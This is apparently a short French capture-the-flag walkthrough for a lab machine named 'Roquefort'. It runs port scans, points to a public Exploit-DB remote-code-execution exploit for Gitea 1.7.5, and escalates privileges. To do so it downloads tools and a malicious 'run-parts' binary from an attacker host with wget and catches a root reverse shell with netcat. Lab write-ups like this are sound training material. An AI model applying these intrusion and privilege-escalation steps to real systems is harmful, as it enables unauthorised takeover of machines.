  # Roquefort

	sudo masscan -p1-65535,U:1-65535 192.168.151.67 -e tun0 > ports.txt
	sudo nmap -p- -sV -T4 192.168.151.67 -oN nmap.txt
	feroxbuster --silent -u http://192.168.151.67:3000
	
Scans classiques.

	PORT STATE SERVICE VERSION  
	21/tcp open ftp ProFTPD 1.3.5b  
	22/tcp open ssh OpenSSH 7.4p1 Debian 10+deb9u7 (protocol 2.0)  
	53/tcp closed domain  
	3000/tcp open ppp?


Sur le port 3000 on trouve un site utilisant Gitea. La version est affichée dans le footer : "Gitea Version: 1.7.5"

Un exploit existe pour cette version, voir : https://www.exploit-db.com/exploits/49383

Pour les identifiants à modifier dans l'exploit, il suffit de s'enregistrer sur le site puisque c'est permis. 

	vim ~/000_exploits/exploit_Gitea_RCE.py
	python ~/000_exploits/exploit_Gitea_RCE.py
	
	
### Élévation de privilèges : 

	wget http://192.168.45.151/linpeas.sh
	chmod u+x ./linpeas.sh
	./linpeas.sh > res.txt
	less -R res.txt
	wget http://192.168.45.151/pspy
	chmod u+x ./pspy
	./pspy

En inspectant les processus avec Pspy on voit qu'un programme "run-part" est lancé régulièrement et que le dossier /usr/bin/local situé en deuxième place dans le PATH est accessible en écriture. Il suffit d'insérer un "run-path" malicieux dans /usr/bin/local et il n'y aura plus qu'à attendre la tâche planifiée : 

	wget http://192.168.45.151/run-parts /usr/bin/local/run-part
	chmod 777 run-part
	==========
	rlwrap nc -nvlp 443
	...
	whoami
	cat /root/proof.txt
